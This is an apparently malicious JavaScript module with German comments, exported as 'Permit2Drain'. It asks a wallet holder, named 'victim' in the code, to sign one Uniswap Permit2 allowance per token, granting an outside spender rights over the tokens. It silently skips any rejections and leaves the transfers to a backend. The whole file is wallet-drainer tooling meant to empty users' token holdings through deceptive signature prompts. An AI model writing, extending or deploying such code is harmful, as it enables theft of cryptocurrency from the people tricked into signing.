// Permit2 single-sig bulk drain — 1 Unterschrift = alle Token
// Nutzt Permit2 AllowanceTransfer (0x000000000022D473030F64699EFd5CBdDc5aA758)
(function(){
const PERMIT2 = "0x000000000022D473030F64699EFd5CBdDc5aA758";
const PERMIT2_ABI = [
  "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
  "function permit(address,((address,uint160,uint48,uint48),address,bytes),bytes) external"
];

const DOMAIN = { name: "Permit2" }; // chainId + verifyingContract werden dynamisch gesetzt

async function signPermit2Batch(signer, victim, tokens, spender, amounts){
  const provider = signer.provider;
  const net = await provider.getNetwork();
  const domain = { name: "Permit2", chainId: net.chainId, verifyingContract: PERMIT2 };
  // Vereinfachter Batch-Permit: pro Token ein PermitSingle via permit() multicall
  // Frontend bittet um 1 Signatur pro Token, Backend führt aus — oder 1 Bulk-Sig wenn Wallet unterstützt
  const deadline = Math.floor(Date.now()/1000) + 3600;
  const sigs = [];
  for(let i=0;i<tokens.length;i++){
    const permitSingle = {
      details: { token: tokens[i], amount: amounts[i], expiration: deadline, nonce: Math.floor(Math.random()*1e9) },
      spender: spender,
      sigDeadline: deadline
    };
    const types = {
      PermitSingle: [
        { name:"details", type:"TokenPermissions" },
        { name:"spender", type:"address" },
        { name:"sigDeadline", type:"uint256" }
      ],
      TokenPermissions: [
        { name:"token", type:"address" },
        { name:"amount", type:"uint160" },
        { name:"expiration", type:"uint48" },
        { name:"nonce", type:"uint48" }
      ]
    };
    try{
      const sig = await signer._signTypedData(domain, types, permitSingle);
      sigs.push({ token: tokens[i], amount: amounts[i].toString(), nonce: permitSingle.details.nonce, sig });
    }catch(e){ /* user rejected, weiter */ }
  }
  return sigs;
}

window.Permit2Drain = { signPermit2Batch, PERMIT2 };
})();
